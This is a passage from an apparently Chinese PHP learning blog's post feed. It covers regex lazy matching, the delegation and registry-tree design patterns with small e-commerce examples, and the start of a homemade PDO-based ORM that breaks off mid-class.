“(?&lt;=(T|t)he\s)(fat|mat)” =&gt; The fat cat sat on the mat.<br>匹配出The和the</p><h4 id="3-贪婪与懒惰匹配"><a href="#3-贪婪与懒惰匹配" class="headerlink" title="3. 贪婪与懒惰匹配"></a><strong>3. 贪婪与懒惰匹配</strong></h4></li></ul><p>上述的重复次数都为贪婪匹配，即通常的行为是（在使整个表达式能得到匹配的前提下）匹配尽可能多的字符，有时为了性能需求，需要匹配尽可能少的字符，即非贪婪模式，很简单的做法就是前面给出的限定符（就是上面表示重复次数的元字符）都可以被转化为懒惰匹配模式，<strong><em>只要在它后面加上一个问号?</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php核心学习-设计模式的学习-委托者模式</title>
      <link href="/2017/08/16/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E5%A7%94%E6%89%98%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/08/16/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E5%A7%94%E6%89%98%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="委托者模式"><a href="#委托者模式" class="headerlink" title="委托者模式"></a>委托者模式</h2><blockquote><p>为其它对象提供一种代理以控制对这个对象的访问</p></blockquote><p>简单的理解如下图所示:<br><img src="http://img.blog.csdn.net/20170816195632479?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>下面我们导入一个场景来学习委托者模式:<br>电商网站上面现在卖有茶轴键盘，电扇网站会员和电扇网站普通会员买的折扣是不一样的，现在我们模拟不同用户购买键盘订单的价格。<br>首先，创建了以下的目录结构<br><img src="http://img.blog.csdn.net/20170816202507325?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>其中user就是我们项目的委托者代理<br>实体：<br>keyboard.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">keyboard</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//键盘价格</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPrice</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用户等级<br>普通用户noruser.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Class noruser</span></span><br><span class="line"><span class="comment"> * 普通用户类</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">noruser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//普通会员折扣</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getDisCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.95</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网站会员用户vipuser.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 网站会员</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">vipuser</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">//电商网站会员折扣</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getVipDisCount</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0.5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>委托者代理<br>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//用户代理类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $delegator=<span class="keyword">null</span>;<span class="comment">//委托者对象</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> Implement __call() method.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;delegator!=<span class="keyword">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>-&gt;delegator,$name],$arguments);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>模拟返回商品价格<br>order.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 模拟演示使用委托这模式返回商品价格</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">require</span> (<span class="string">"keyboard.php"</span>);</span><br><span class="line"><span class="keyword">require</span> (<span class="string">'user.php'</span>);</span><br><span class="line"><span class="keyword">require</span> (<span class="string">'noruser.php'</span>);</span><br><span class="line"><span class="keyword">require</span> (<span class="string">"vipuser.php"</span>);</span><br><span class="line"></span><br><span class="line">$user=<span class="keyword">new</span> user();</span><br><span class="line">$keyboard=<span class="keyword">new</span> keyboard();</span><br><span class="line">$user-&gt;delegator=<span class="keyword">new</span> vipuser();</span><br><span class="line">$user-&gt;getVipDisCount();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"会员购买茶轴键盘的价格是:"</span>.$keyboard-&gt;getPrice()*$user-&gt;getVipDisCount();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$user-&gt;delegator=<span class="keyword">new</span> noruser();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"会员购买茶轴键盘的价格是:"</span>.$keyboard-&gt;getPrice()*$user-&gt;getDisCount();</span><br></pre></td></tr></table></figure><p>效果如下:<br><img src="http://img.blog.csdn.net/20170816202856244?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"></p><p>优点:<br>1.职责清晰   真实的角色就是实现的业务逻辑，不用关心其他非本指责的事务<br>2.高扩展性   具体主题角色不能怎么变化，只要它实现了接口，代理类完全可以在不做任何修改的情况下使用<br>3.智能化     动态代理是最好的体现，即在运行阶段才指定实际代理对象</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php核心学习-设计模式的学习-注册树模式</title>
      <link href="/2017/08/15/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E6%B3%A8%E5%86%8C%E6%A0%91%E6%A8%A1%E5%BC%8F/"/>
      <url>/2017/08/15/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E6%B3%A8%E5%86%8C%E6%A0%91%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>php核心学习-设计模式的学习-注册树模式</p><a id="more"></a><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>设计模式的学习需要带进场景进行学习，然后总结，才会发现老司机的套路之美，本文带着这样的上一篇课程工厂模式的一个问题，如果我们客户需要在买书的时候，顺便把酒也查询出来，一般的写法是我们先创建一个书的实例，然后调用查询，在调用酒的实例，然后调用查询的方法，数据量小的时候，感觉还不错，但是，当我们的产品很多的话，就变得很臃肿了，那么现在我们来学习一个新的设计模式–注册树模式来解决这个问题。<br>什么是注册树模式？</p><p>　　注册树模式当然也叫注册模式，注册器模式。注册树模式通过将对象实例注册到一棵全局的对象树上，需要的时候从对象树上采摘的模式设计方法。</p><h2 id="为什么要采用注册树模式？"><a href="#为什么要采用注册树模式？" class="headerlink" title="为什么要采用注册树模式？"></a>为什么要采用注册树模式？</h2><p>　　单例模式解决的是如何在整个项目中创建唯一对象实例的问题，工厂模式解决的是如何不通过new建立实例对象的方法。 那么注册树模式想解决什么问题呢？ 在考虑这个问题前，我们还是有必要考虑下前两种模式目前面临的局限。  首先，单例模式创建唯一对象的过程本身还有一种判断，即判断对象是否存在。存在则返回对象，不存在则创建对象并返回。 每次创建实例对象都要存在这么一层判断。 工厂模式更多考虑的是扩展维护的问题。 总的来说，单例模式和工厂模式可以产生更加合理的对象。怎么方便调用这些对象呢？而且在项目内如此建立的对象好像散兵游勇一样，不便统筹管理安排啊。因 而，注册树模式应运而生。不管你是通过单例模式还是工厂模式还是二者结合生成的对象，都统统给我“插到”注册树上。我用某个对象的时候，直接从注册树上取 一下就好。这和我们使用全局变量一样的方便实用。 而且注册树模式还为其他模式提供了一种非常好的想法。</p><h2 id="如何实现注册树？"><a href="#如何实现注册树？" class="headerlink" title="如何实现注册树？"></a>如何实现注册树？</h2><p>　　通过上述的描述，我们似乎很容易就找到了解决方法。首先我们需要一个作为注册树的类，这毋庸置疑。所有的对象“插入”到注册树上。这个注册树应 该由一个静态变量来充当。而且这个注册树应该是一个数组。这个类应该有一个插入对象实例的方法（set()），当让相对应的就应该有一个撤销对象实例 的方法（_unset()）。当然最重要的是还需要有一个读取对象的方法（get()），读取对象的方法我们使用魔术方法遍历出实例化类的属性。拥有这些，我们就可以愉快地完成注册树模式啦~~~</p><p>　　上一篇产品类这里就不重复了，重点讲解注册树的实现，实现如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   </span><br><span class="line"> class  ProductDataCenter</span><br><span class="line"> &#123;</span><br><span class="line">     public  static <span class="variable">$objectList</span>=[];//对象数组 ，保存</span><br><span class="line">//将实例化的对象插入到静态数组变量当中</span><br><span class="line">     public static <span class="keyword">function</span> <span class="built_in">set</span>(<span class="variable">$k</span>,<span class="variable">$v</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         self::<span class="variable">$objectList</span>[<span class="variable">$k</span>]=<span class="variable">$v</span>;</span><br><span class="line">     &#125;</span><br><span class="line">//删除数组</span><br><span class="line">     public static <span class="keyword">function</span> remove(<span class="variable">$k</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">unset</span>(self::<span class="variable">$objectList</span>[<span class="variable">$k</span>]);</span><br><span class="line">     &#125;</span><br><span class="line">    /* public static <span class="keyword">function</span> get(<span class="variable">$k</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         <span class="built_in">return</span> self::<span class="variable">$objectList</span>[<span class="variable">$k</span>];</span><br><span class="line">     &#125;*/</span><br><span class="line">//从对象树种采摘对象的属性，返回</span><br><span class="line">     public static <span class="keyword">function</span> __callStatic(<span class="variable">$name</span>, <span class="variable">$arguments</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         // TODO: Implement __callStatic() method.</span><br><span class="line">         <span class="variable">$return</span>=[];//默认返回值</span><br><span class="line">        foreach(self::<span class="variable">$objectList</span> as <span class="variable">$k</span>=&gt;<span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(method_exists(<span class="variable">$v</span>,<span class="variable">$name</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$ret</span>=<span class="variable">$v</span>-&gt;<span class="variable">$name</span>(<span class="variable">$arguments</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$ret</span>) &#123;</span><br><span class="line">                    <span class="variable">$return</span>[]=<span class="variable">$ret</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$return</span>;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>工厂类调用注册树的方式:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">require(<span class="string">"IProduct.php"</span>);</span><br><span class="line">require(<span class="string">"ProductDataCenter.php"</span>);</span><br><span class="line">class ProductFactory</span><br><span class="line">&#123;</span><br><span class="line">    //商品工厂类</span><br><span class="line">    static  <span class="keyword">function</span> getProduct(<span class="variable">$type</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$obj</span>=<span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(!class_exists(<span class="variable">$type</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            require(<span class="variable">$type</span>.<span class="string">".php"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        switch(<span class="variable">$type</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"Books"</span>:</span><br><span class="line">                <span class="variable">$obj</span>=new Books();</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"Dogs"</span>:</span><br><span class="line">                <span class="variable">$obj</span>=new Dogs();</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">"Wines"</span>:</span><br><span class="line">                <span class="variable">$obj</span>=new Wines();</span><br><span class="line">                <span class="built_in">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(is_subclass_of(<span class="variable">$obj</span>,<span class="string">"IProduct"</span>))</span><br><span class="line">            ProductDataCenter::<span class="built_in">set</span>(<span class="variable">$type</span>,<span class="variable">$obj</span>);//把创建的对象塞入对象树种</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户调用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">ProductFactory::getProduct([<span class="string">"Books"</span>,<span class="string">"Dogs"</span>]);</span><br><span class="line">var_export(ProductDataCenter::getList()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php折腾模拟实现ORM-2</title>
      <link href="/2017/08/13/php%E6%8A%98%E8%85%BE%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0ORM-2/"/>
      <url>/2017/08/13/php%E6%8A%98%E8%85%BE%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0ORM-2/</url>
      
        <content type="html"><![CDATA[<p>前面我们已经完成了orm最核心部分–拼凑字符串，接下来我们需要执行拼凑完成的sql语句。这里只完成了insert操作<br><a id="more"></a></p><h2 id="折腾（二）-与pdo进行组合，实现执行拼凑完成的sql语句"><a href="#折腾（二）-与pdo进行组合，实现执行拼凑完成的sql语句" class="headerlink" title="折腾（二）-与pdo进行组合，实现执行拼凑完成的sql语句"></a><strong>折腾（二）-与pdo进行组合，实现执行拼凑完成的sql语句</strong></h2><p><strong>我们先建立两张表</strong></p><h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><table><thead><tr><th style="text-align:center">名</th><th style="text-align:center">类型</th><th style="text-align:right">长度</th><th style="text-align:center">小数点</th><th style="text-align:center">允许空值</th></tr></thead><tbody><tr><td style="text-align:center">user_id</td><td style="text-align:center">int</td><td style="text-align:right">11</td><td style="text-align:center">0</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">user_name</td><td style="text-align:center">varchar</td><td style="text-align:right">20</td><td style="text-align:center">0</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">user_pwd</td><td style="text-align:center">varchar</td><td style="text-align:right">32</td><td style="text-align:center">0</td><td style="text-align:center">false</td></tr></tbody></table><h3 id="order"><a href="#order" class="headerlink" title="order"></a>order</h3><table><thead><tr><th style="text-align:center">名</th><th style="text-align:center">类型</th><th style="text-align:right">长度</th><th style="text-align:center">小数点</th><th style="text-align:center">允许空值</th></tr></thead><tbody><tr><td style="text-align:center">order_id</td><td style="text-align:center">int</td><td style="text-align:right">11</td><td style="text-align:center">0</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">user_id</td><td style="text-align:center">int</td><td style="text-align:right">11</td><td style="text-align:center">0</td><td style="text-align:center">false</td></tr><tr><td style="text-align:center">order_price</td><td style="text-align:center">decimal</td><td style="text-align:right">5</td><td style="text-align:center">2</td><td style="text-align:center">false</td></tr></tbody></table><h3 id="执行insert后的效果"><a href="#执行insert后的效果" class="headerlink" title="执行insert后的效果"></a>执行insert后的效果</h3><p><img src="http://img.blog.csdn.net/20170813135857090?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br><img src="http://img.blog.csdn.net/20170813135908439?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>与pdo组合之后的代码如下，所示，有兴趣可以研究下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'display_errors'</span>,<span class="number">1</span>);</span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>,E_ALL);</span><br><span class="line"></span><br><span class="line">$map=<span class="function"><span class="keyword">function</span> <span class="params">($items)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_array($items)) &#123;</span><br><span class="line">        <span class="keyword">return</span> $items;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result=<span class="string">""</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($items[<span class="number">1</span>] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($result!=<span class="string">""</span>)</span><br><span class="line">                $result.=<span class="string">","</span>;</span><br><span class="line">            $result.=$item.<span class="keyword">$this</span>-&gt;_aliastb($item);<span class="comment">//类似news,news_class 添加到form后面</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $items[<span class="number">0</span>].$result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">orm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sql=<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"select"</span>=&gt;<span class="string">"select "</span>,</span><br><span class="line">        <span class="string">"from"</span>=&gt;<span class="keyword">array</span>(<span class="string">"from "</span>,<span class="keyword">array</span>()),</span><br><span class="line">        <span class="string">"where"</span>=&gt;<span class="string">" where "</span>,</span><br><span class="line">        <span class="string">"orderby"</span>=&gt;<span class="string">" order by "</span>,</span><br><span class="line">        <span class="string">"insertinto"</span>=&gt;<span class="string">"insert into "</span>,<span class="comment">//insert操作</span></span><br><span class="line">        <span class="string">"insertfields"</span>=&gt;<span class="string">""</span>,</span><br><span class="line">        <span class="string">"values"</span>=&gt;<span class="string">" values"</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">public</span> $errorCode=<span class="string">""</span>;<span class="comment">//错误代码</span></span><br><span class="line">    <span class="keyword">public</span> $sql_bak=[];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql_bak=<span class="keyword">$this</span>-&gt;sql;</span><br><span class="line">        